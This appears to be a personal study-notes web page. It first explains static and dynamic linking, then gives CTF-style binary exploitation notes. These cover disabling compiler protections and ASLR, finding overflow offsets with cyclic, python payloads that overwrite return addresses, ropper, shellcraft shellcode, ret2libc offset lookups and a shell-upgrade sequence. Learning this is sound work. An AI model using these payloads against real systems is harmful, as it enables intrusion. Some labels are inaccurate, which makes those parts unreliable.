<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="2022-06-30  Linker Linking is the process of bringing external programs together required by the one we write for its successful execution."><title>2022-06-30</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=ico href=https://pietraferreira.github.io/quartz//favicon.ico><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Source+Sans+Pro:wght@400;600;700&family=Fira+Code:wght@400;700&display=swap" rel=stylesheet><link href=https://pietraferreira.github.io/quartz/styles.9759d10f42f6dfbd0ef0f3c6980eb713.min.css rel=stylesheet><link href=https://pietraferreira.github.io/quartz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://pietraferreira.github.io/quartz/js/darkmode.da0f555066e9a83601dc021ca1ac00ad.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script src=https://pietraferreira.github.io/quartz/js/popover.688c5dcb89a57776d7f1cbeaf6f7c44b.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
<script>const BASE_URL="https://pietraferreira.github.io/quartz/",fetchData=Promise.all([fetch("https://pietraferreira.github.io/quartz/indices/linkIndex.54d85fd4a9e2d34f3d00ffdc0b4e86ce.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://pietraferreira.github.io/quartz/indices/contentIndex.6b63de8f32cec2ca2a6310c6a6d08f34.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const n=new URL(BASE_URL),s=n.pathname,o=window.location.pathname,i=s==o;addTitleToCodeBlocks();const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=i&&!1;drawGraph("https://pietraferreira.github.io/quartz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2}),initPopover("https://pietraferreira.github.io/quartz",!0,!0)},init=(e=document)=>{addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/pietraferreira.github.io\/quartz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
    attachSPARouting(init, render)
  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://pietraferreira.github.io/quartz/js/search.cf33b507388f3dfd5513a2afcda7af41.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://pietraferreira.github.io/quartz/>ðŸª… Morioh</a></h1><svg tabindex="0" id="search-icon" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg><div class=spacer></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>2022-06-30</h1><p class=meta>Last updated July 3, 2022</p><ul class=tags><li><a href=https://pietraferreira.github.io/quartz/tags/linker/>Linker</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#static-linking>Static Linking</a></li><li><a href=#dynamically-linking>Dynamically Linking</a></li></ol><ol><li><a href=#00>00</a></li><li><a href=#01>01</a></li><li><a href=#02>02</a></li><li><a href=#03>03</a></li><li><a href=#04>04</a></li><li><a href=#05>05</a></li><li><a href=#06>06</a><ol><li><a href=#useful-tools>Useful tools</a></li></ol></li></ol></nav></details></aside><a href=#2022-06-30><h1 id=2022-06-30><span class=hanchor arialabel=Anchor># </span>2022-06-30</h1></a><hr><a href=#linker><h1 id=linker><span class=hanchor arialabel=Anchor># </span>Linker</h1></a><p>Linking is the process of bringing external programs together required by the one we write for its successful execution. <strong>Static</strong> and <strong>dynamic</strong> linking are two processes of collecting and combining multiple object files in order to create a single executable.</p><p>Linking can happen at both <strong>compile</strong> and <strong>load</strong> time.</p><ul><li>Compile time: source code is translated into machine code.</li><li>Load time: program is loaded into memory by the loader, and even at run time, by application programs.</li></ul><a href=#static-linking><h2 id=static-linking><span class=hanchor arialabel=Anchor># </span>Static Linking</h2></a><p>It is the process of copying all library modules used in the program into the final executable image.</p><p>This is performed by the linker and it is done as the last step of the compilation process. The linker combines library routines with the program code in order to resolve external references, and to generate an executable image suitable for loading into memory. When the program is loaded, the operating system places into memory a single file that contains the executable code and data.</p><p>This statically linked file includes both the calling program and the called program.</p><p>Statically linked files are significantly larger in size because external programs are built into the executable files.</p><p>They also take constant load time every time it is loaded into the memory for execution and if anything is changed in the program, it has to be recompiled and re-linked again else the changes won&rsquo;t reflect in existing executable file.</p><p>Programs in general are faster though and all code is contained in a single executable module. Therefore, they never run into compatibility issues.</p><a href=#dynamically-linking><h2 id=dynamically-linking><span class=hanchor arialabel=Anchor># </span>Dynamically Linking</h2></a><p>The names of the external libraries (shared libraries) are placed in the final executable file while the actual linking takes place at run time when both executable file and libraries are placed in memory. Dynamically linking lets several programs use a single copy of executable module.</p><p>It is performed at run time by the OS and only one copy of the shared library is kept in memory. This significantly reduces the size of executable programs, thereby saving memory and disk space.</p><p>Individual shared modules can be updated and re-compiled, it is one of the greatest advantage. Additionally, load time might be reduced if the shared library code is already in memory.</p><p>They do depend on a compatible library. Therefore, if the library changes, applications might need to be re-worked.</p><hr><a href=#binary-exploitation><h1 id=binary-exploitation><span class=hanchor arialabel=Anchor># </span>Binary Exploitation</h1></a><a href=#00><h2 id=00><span class=hanchor arialabel=Anchor># </span>00</h2></a><ul><li>Check file vulnerabilities:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>checksec --file &lt;filename&gt;
</span></span></code></pre></td></tr></table></div></div><ul><li>Gets rid of Stack, NX and PIE protection (-m32 changes to 32bits):</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc &lt;filename&gt;.c -o &lt;filename&gt; -fno-stack-protector -z execstack -no-pie -m32
</span></span></code></pre></td></tr></table></div></div><a href=#01><h2 id=01><span class=hanchor arialabel=Anchor># </span>01</h2></a><p>GDB-Pwndbg:</p><ul><li>It breaks exactly where the breakpoint is.</li></ul><p>To view a variable/condition you can use the code below. This would print the location of the result, so it is a pointer to a register that holds it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>x <span class=nv>$ebp</span> - 0xc
</span></span></code></pre></td></tr></table></div></div><p>You can then change that register like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>set</span> *0xffffceac <span class=o>=</span> <span class=m>1</span>
</span></span></code></pre></td></tr></table></div></div><a href=#02><h2 id=02><span class=hanchor arialabel=Anchor># </span>02</h2></a><p>If file type is <strong>LSB</strong> then reverse order, for example <em>dead</em> would be <em>daed</em>. To get it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python2 -c <span class=s1>&#39;print 32 * &#34;A&#34; + &#34;\xef\xbe\xad\xde&#34;&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Send to a file and run with it: (xD)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python2 -c <span class=s1>&#39;print 32 * &#34;A&#34; + &#34;\xef\xbe\xad\xde&#34;&#39;</span> &gt; payload
</span></span><span class=line><span class=cl>./runMeImaFile &lt; payload
</span></span></code></pre></td></tr></table></div></div><a href=#03><h2 id=03><span class=hanchor arialabel=Anchor># </span>03</h2></a><p>Radare2:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aa
</span></span><span class=line><span class=cl>afl
</span></span></code></pre></td></tr></table></div></div><p>We can use <code>cyclic 100</code> in <code>gdb-pwndbg</code> to generate a pattern, then run that into the program. We then get the characters in the register (eg <code>eip</code>) and run <code>cyclic -l &lt;string></code>, so for example:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cyclic -l haaa
</span></span></code></pre></td></tr></table></div></div><p>It will return how many bytes we need to overflow.</p><p>If the function we want to access is in <code>0x08049182</code> for example, we can do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python2 -c <span class=s1>&#39;print &#34;A&#34; * 28 + &#34;\x82\x91\x04\x08&#34;&#39;</span> &gt; payload
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ropper --file ret2win_params --search <span class=s2>&#34;pop rsi&#34;</span>
</span></span></code></pre></td></tr></table></div></div><a href=#04><h2 id=04><span class=hanchor arialabel=Anchor># </span>04</h2></a><p>We check the <code>cycle</code>, then figure out how much to overflow. We find the <code>return</code> address (what function returns), set a breakpoint to it then run the program with the payload generated.</p><p>deadbeef = <code>\xef\xbe\xad\xde</code></p><p>When a function is called, the return pointer is pushed to the stack, so it knows where to return to, followed by any function parameters.</p><p>With 64bits, we have to populate the registers not just send the parameters, for example <code>rdi</code> and <code>rsi</code>. We also when running <code>cyclic</code> take the values from the <code>RSP</code>, for example the first four.</p><a href=#05><h2 id=05><span class=hanchor arialabel=Anchor># </span>05</h2></a><p>Getting a shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>shellcraft -l
</span></span><span class=line><span class=cl>shellcraft i386.linux.sh
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># to get it in assembly:</span>
</span></span><span class=line><span class=cl>shellcraft i386.linux.sh -f a
</span></span></code></pre></td></tr></table></div></div><p>To get a reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># control + z</span>
</span></span><span class=line><span class=cl>stty raw -echo<span class=p>;</span> fg<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></td></tr></table></div></div><a href=#06><h2 id=06><span class=hanchor arialabel=Anchor># </span>06</h2></a><p>This file is safer as you can see with <code>checksec</code>. Therefore, we need to execute <code>bin/sh</code> from LibC.</p><p>To find libC we can run <code>ldd &lt;filename></code>.</p><p>To turn off randomiser:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=m>0</span> <span class=p>|</span> sudo tee /proc/sys/kernel/randomize_va_space
</span></span></code></pre></td></tr></table></div></div><p>To get libC address:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldd &lt;filename&gt;
</span></span></code></pre></td></tr></table></div></div><p>To find the offset from base libC to system:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>readelf -s /lib/i386-linux-gnu/libc.so.6 <span class=p>|</span> grep system
</span></span></code></pre></td></tr></table></div></div><p>To find offset to <code>/bin/sh</code> for example:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>strings -a -t x /lib/i386-linux-gnu/libc.so.6 <span class=p>|</span> grep <span class=s2>&#34;/bin/bash&#34;</span>
</span></span></code></pre></td></tr></table></div></div><a href=#useful-tools><h3 id=useful-tools><span class=hanchor arialabel=Anchor># </span>Useful tools</h3></a><ul><li>Ghidra</li><li>GDB</li><li>Radare2</li><li>Ropper</li><li>GDB-PwnDBG</li><li>LTrace</li></ul></article><hr><div class=page-end><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://pietraferreira.github.io/quartz/js/graph.afdb02e537635f9a611b53a988e5645b.js></script></div></div><div id=contact_buttons><footer><p>Made by Morioh using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, Â© 2022</p><ul><li><a href=/>Home</a></li><li><a href=https://github.com/pietraferreira>Github</a></li></ul></footer></div></div></body></html>